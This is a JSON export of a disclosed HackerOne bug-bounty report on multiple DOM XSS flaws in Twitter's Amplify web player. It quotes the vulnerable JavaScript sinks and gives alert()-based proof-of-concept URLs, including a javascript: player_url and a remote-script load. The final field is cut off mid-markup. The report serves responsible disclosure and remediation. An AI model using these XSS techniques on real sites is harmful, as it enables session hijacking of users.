{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-03-16T08:27:50.825Z", 
    "voters": [
        "delimitry", 
        "arneswinnen", 
        "michiel", 
        "bobrov", 
        "spam404", 
        "kapytein", 
        "orange", 
        "hackerhero", 
        "zombiehelp54", 
        "bogdantcaciuc", 
        "and 51 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "2520.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 88719, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Multiple DOMXSS on Amplify Web Player", 
    "is_member_of_team?": null, 
    "vote_count": 61, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-04-15T08:27:50.857Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$2,520", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-09-14T23:14:42.687Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-14T23:14:42.687Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p>Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 588159, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-15T16:46:59.463Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-15T16:46:59.463Z", 
            "actor": {
                "username": "filedescriptor", 
                "url": "/filedescriptor", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "Here's another one. I'll keep updating here when I find more of them.\n\n#4. Lack of HTML characters filtering on ```e.text```\n```javascript\n        this.render = function() {\n            var e = this.attr.status\n              , n = this.attr.statusTimestamp\n              , r = this.attr.user;\n            this.followIntentUrl = \"https://twitter.com/intent/follow?screen_name=\" + r.screen_name,\n            this.select(\"authorLink\").attr(\"href\", \"https://twitter.com/\" + r.screen_name),\n            this.select(\"authorName\").text(r.name),\n            this.select(\"authorProfileImage\").attr(\"src\", r.profile_image_url),\n            this.select(\"authorScreenName\").text(\"@\" + r.screen_name),\n            this.select(\"followButton\").attr(\"href\", this.followIntentUrl),\n            this.select(\"followText\").text(t(\"Follow\")),\n            this.select(\"tweetPermalink\").attr(\"href\", \"https://twitter.com/\" + r.screen_name + \"/status/\" + e.id_str),\n            this.select(\"tweetText\").html(this.getStatusTextHtml(e.text, e.entities)),\n-------------------------------------------------------------------^^\n```\n\nIn short ```e.text``` is directly inserted into the DOM without sensitization.\n**PoC**: http://innerht.ml/pocs/twitter-amp-xss/text.html\n\nThis one requires **no user interaction**.", 
            "markdown_message": "<p>Here&#39;s another one. I&#39;ll keep updating here when I find more of them.</p>\n\n<h1 id=\"4-lack-of-html-characters-filtering-on-e-text\">4. Lack of HTML characters filtering on <code>e.text</code>\n</h1>\n<pre class=\"highlight javascript\"><code>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">render</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">e</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">.</span><span class=\"nx\">status</span>\n              <span class=\"p\">,</span> <span class=\"nx\">n</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">.</span><span class=\"nx\">statusTimestamp</span>\n              <span class=\"p\">,</span> <span class=\"nx\">r</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">.</span><span class=\"nx\">user</span><span class=\"p\">;</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">followIntentUrl</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;https://twitter.com/intent/follow?screen_name=&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">screen_name</span><span class=\"p\">,</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;authorLink&quot;</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;href&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;https://twitter.com/&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">screen_name</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;authorName&quot;</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">(</span><span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;authorProfileImage&quot;</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;src&quot;</span><span class=\"p\">,</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">profile_image_url</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;authorScreenName&quot;</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">(</span><span class=\"s2\">&quot;@&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">screen_name</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;followButton&quot;</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;href&quot;</span><span class=\"p\">,</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">followIntentUrl</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;followText&quot;</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">(</span><span class=\"nx\">t</span><span class=\"p\">(</span><span class=\"s2\">&quot;Follow&quot;</span><span class=\"p\">)),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;tweetPermalink&quot;</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;href&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;https://twitter.com/&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">r</span><span class=\"p\">.</span><span class=\"nx\">screen_name</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;/status/&quot;</span> <span class=\"o\">+</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">id_str</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;tweetText&quot;</span><span class=\"p\">).</span><span class=\"nx\">html</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">getStatusTextHtml</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">text</span><span class=\"p\">,</span> <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">entities</span><span class=\"p\">)),</span>\n<span class=\"o\">-------------------------------------------------------------------^^</span>\n</code></pre>\n<p>In short <code>e.text</code> is directly inserted into the DOM without sensitization.<br>\n<strong>PoC</strong>: <a title=\"http://innerht.ml/pocs/twitter-amp-xss/text.html\" href=\"/redirect?signature=02ea5885c4aea755d7cbecbcab3fac30c0a53958&amp;url=http%3A%2F%2Finnerht.ml%2Fpocs%2Ftwitter-amp-xss%2Ftext.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://innerht.ml/pocs/twitter-amp-xss/text.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>This one requires <strong>no user interaction</strong>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 588835, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-09-18T19:22:17.944Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-18T19:22:17.944Z", 
            "actor": {
                "url": "/twitter", 
                "profile": {
                    "name": "Twitter"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
                }
            }, 
            "team_handle": "twitter", 
            "bounty_amount": "1120.0", 
            "collaborator": {
                "username": "filedescriptor", 
                "url": "/filedescriptor"
            }, 
            "message": "Thanks again. As mentioned we\u2019ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.", 
            "markdown_message": "<p>Thanks again. As mentioned we\u2019ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 592269, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "filedescriptor", 
                "url": "/filedescriptor"
            }, 
            "created_at": "2015-09-24T18:56:30.257Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-24T18:56:30.257Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p>We consider this issue to be fixed now. Can you please confirm?</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 597582, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-25T04:11:21.390Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-25T04:11:21.390Z", 
            "actor": {
                "username": "filedescriptor", 
                "url": "/filedescriptor", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "I can confirm all the issues are fixed, thanks!", 
            "markdown_message": "<p>I can confirm all the issues are fixed, thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 597930, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-14T09:22:09.471Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-14T09:24:36.853Z", 
            "actor": {
                "username": "filedescriptor", 
                "url": "/filedescriptor", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "Just realized https://twitter.com/i/videos/ actually uses the same vulnerable scripts (e.g. https://twitter.com/i/videos/652947317134262272) from https://amp.twimg.com/amplify-web-player/prod/js/build.min.js. Any chance to increase the original bounty as it could have allowed XSS on https://twitter.com ?", 
            "markdown_message": "<p>Just realized <a title=\"https://twitter.com/i/videos/\" href=\"/redirect?signature=25b2b2643a1c24619585e884c20eaf543a1d9c10&amp;url=https%3A%2F%2Ftwitter.com%2Fi%2Fvideos%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/i/videos/</span><i class=\"icon-external-link\"></i></a> actually uses the same vulnerable scripts (e.g. <a title=\"https://twitter.com/i/videos/652947317134262272\" href=\"/redirect?signature=efa963395c1b375a404cec9c7336951c69f6c656&amp;url=https%3A%2F%2Ftwitter.com%2Fi%2Fvideos%2F652947317134262272\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/i/videos/652947317134262272</span><i class=\"icon-external-link\"></i></a>) from <a title=\"https://amp.twimg.com/amplify-web-player/prod/js/build.min.js\" href=\"/redirect?signature=d0793dde29716a91ce9c229ca3f05e3310439ada&amp;url=https%3A%2F%2Famp.twimg.com%2Famplify-web-player%2Fprod%2Fjs%2Fbuild.min.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://amp.twimg.com/amplify-web-player/prod/js/build.min.js</span><i class=\"icon-external-link\"></i></a>. Any chance to increase the original bounty as it could have allowed XSS on <a title=\"https://twitter.com\" href=\"/redirect?signature=8d7f26a316eacdf133e1c731ef2b6997ff1fbbb0&amp;url=https%3A%2F%2Ftwitter.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com</span><i class=\"icon-external-link\"></i></a> ?</p>\n", 
            "type": "Activities::Comment", 
            "id": 620081, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-14T18:10:52.840Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-14T18:10:52.840Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "@filedescriptor Thanks for bringing this to our attention. We'll take a look at this issue again.\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p><a href=\"/filedescriptor\">@filedescriptor</a> Thanks for bringing this to our attention. We&#39;ll take a look at this issue again.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::Comment", 
            "id": 620599, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-16T17:35:26.295Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-16T17:35:26.295Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "@filedescriptor normally we go through payouts on Friday but it might take a little longer this time. We should be able to get back to you next week.\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p><a href=\"/filedescriptor\">@filedescriptor</a> normally we go through payouts on Friday but it might take a little longer this time. We should be able to get back to you next week.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::Comment", 
            "id": 623091, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-10-23T18:35:32.076Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-23T18:35:56.502Z", 
            "actor": {
                "url": "/twitter", 
                "profile": {
                    "name": "Twitter"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
                }
            }, 
            "team_handle": "twitter", 
            "bounty_amount": "1400.0", 
            "collaborator": {
                "username": "filedescriptor", 
                "url": "/filedescriptor"
            }, 
            "message": "We reevaluated this in light of the additional information you provided, and we agree that this deserves a higher reward. Thanks again for contributing to Twitter security!", 
            "markdown_message": "<p>We reevaluated this in light of the additional information you provided, and we agree that this deserves a higher reward. Thanks again for contributing to Twitter security!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 629965, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-16T08:27:50.842Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-16T08:27:50.842Z", 
            "actor": {
                "username": "filedescriptor", 
                "url": "/filedescriptor", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1544759, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-15T08:27:59.094Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-15T08:27:59.094Z", 
            "actor": {
                "url": "/twitter", 
                "profile": {
                    "name": "Twitter"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
                }
            }, 
            "team_handle": "twitter", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1612931, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "filedescriptor", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/filedescriptor", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -51891165.15522575, 
    "disclosed_at": "2017-04-15T08:27:59.074Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/88719", 
    "created_at": "2015-09-13T13:08:16.024Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,<br>\nI would like to report multiple DOMXSS issues on <a title=\"https://amp.twimg.com/amplify-web-player/prod/source.html\" href=\"/redirect?signature=781bc08ed0ed98e08ecebbf00fc69a28990e37bd&amp;url=https%3A%2F%2Famp.twimg.com%2Famplify-web-player%2Fprod%2Fsource.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://amp.twimg.com/amplify-web-player/prod/source.html</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<h2 id=\"details\">Details:</h2>\n\n<blockquote>\n<p>Please use latest IE to open all the PoCs because of CSP</p>\n</blockquote>\n\n<h2 id=\"1-get-sink\">1. <code>$.get</code> sink</h2>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">define</span><span class=\"p\">(</span><span class=\"s2\">&quot;data/playlist/with_json_loader&quot;</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"s2\">&quot;require&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;flight/lib/compose&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;data/playlist/with_json_parser&quot;</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">function</span> <span class=\"nx\">r</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">mixin</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"nx\">n</span><span class=\"p\">]),</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">loadJson</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">return</span> <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">).</span><span class=\"nx\">then</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">parseJson</span><span class=\"p\">.</span><span class=\"nx\">bind</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">))</span>\n<span class=\"o\">-----------------------^^</span>\n</code></pre>\n<p>It is dangerous to use jQuery&#39;s ajax function without specifying the expected data type. Attacker can supply a remote js file to achieve XSS. This can be addressed by specifying the data type to be JSON. <a href=\"/redirect?signature=dfc71367d11bfe07cac4b186e6accfe602faf711&amp;url=https%3A%2F%2Fgithub.com%2Fjquery%2Fjquery%2Fissues%2F2432\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Ref</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p><strong>PoC</strong>: <a title=\"https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php\" href=\"/redirect?signature=9c184c5e3f40e79ef08e08ad5f3f07e01860018e&amp;url=https%3A%2F%2Famp.twimg.com%2Famplify-web-player%2Fprod%2Fsource.html%3Furl%3Dhttps%3A%2F%2Finnerht.ml%2Fvectors%2Fjs.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php</span><i class=\"icon-external-link\"></i></a><br>\nAfter clicking the play button, an alert will be popped up.</p>\n\n<h2 id=\"2-lack-of-url-validation-on-playerurl\">2. Lack of URL validation on <code>playerUrl</code>\n</h2>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">define</span><span class=\"p\">(</span><span class=\"s2\">&quot;ui/playback/vine_display&quot;</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"s2\">&quot;require&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;flight/lib/component&quot;</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">function</span> <span class=\"nx\">n</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attributes</span><span class=\"p\">({</span>\n            <span class=\"na\">playerUrl</span><span class=\"p\">:</span> <span class=\"kc\">undefined</span>\n        <span class=\"p\">}),</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">$frame</span> <span class=\"o\">=</span> <span class=\"kc\">undefined</span><span class=\"p\">,</span>\n        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">loadVideo</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">.</span><span class=\"nx\">playerUrl</span><span class=\"p\">)</span>\n                <span class=\"k\">return</span><span class=\"p\">;</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">$frame</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">&#39;&lt;iframe id=&quot;vine-frame&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowtransparency=&quot;true&quot;&gt;&lt;/iframe&gt;&#39;</span><span class=\"p\">),</span>\n            <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">$frame</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">&quot;src&quot;</span><span class=\"p\">,</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">.</span><span class=\"nx\">playerUrl</span><span class=\"p\">),</span>\n<span class=\"o\">-----------------------------------------------^^</span>\n</code></pre>\n<p>When the source type is Vine, the player will try to inject an iframe with user-supplied parameter <code>player_url</code>. Attacker can make it a <code>javascript:</code> attacker vector. Proper fix would be to validate if the URL starts with http(s). </p>\n\n<p><strong>PoC</strong>: <a title=\"https://amp.twimg.com/amplify-web-player/prod/source.html?player_url=javascript:alert(1)&amp;source_type=vine\" href=\"/redirect?signature=8b7802cd6ba8803b50291cd83b0e59ecac123887&amp;url=https%3A%2F%2Famp.twimg.com%2Famplify-web-player%2Fprod%2Fsource.html%3Fplayer_url%3Djavascript%3Aalert%281%29%26source_type%3Dvine\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://amp.twimg.com/amplify-web-player/prod/source.html?player_url=javascript:alert(1)&amp;source_type=vine</span><i class=\"icon-external-link\"></i></a><br>\nAfter clicking the play button, an alert will be popped up.</p>\n\n<h2 id=\"3-lack-of-url-validation-on-ctalink\">3. Lack of URL validation on <code>ctaLink</code>\n</h2>\n<pre class=\"highlight javascript\"><code>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">updateCallToAction</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">,</span> <span class=\"nx\">t</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">select</span><span class=\"p\">(</span><span class=\"s2\">&quot;textNodeSelector&quot;</span><span class=\"p\">);</span>\n            <span class=\"nx\">i</span><span class=\"p\">.</span><span class=\"nx\">html</span><span class=\"p\">(</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">);</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">t</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">url</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">id</span> <span class=\"o\">=</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">id</span><span class=\"p\">,</span>\n                <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">type</span> <span class=\"o\">=</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">,</span>\n                <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">ctaLink</span> <span class=\"o\">=</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">url</span><span class=\"p\">;</span>\n                <span class=\"kd\">var</span> <span class=\"nx\">s</span><span class=\"p\">,</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"nx\">n</span><span class=\"p\">.</span><span class=\"nx\">getUrlMetadata</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">ctaLink</span><span class=\"p\">),</span> <span class=\"nx\">u</span> <span class=\"o\">=</span> <span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">hostname</span><span class=\"p\">;</span>\n                <span class=\"nx\">u</span><span class=\"p\">.</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"s2\">&quot;www.&quot;</span><span class=\"p\">)</span> <span class=\"o\">===</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span><span class=\"nx\">u</span> <span 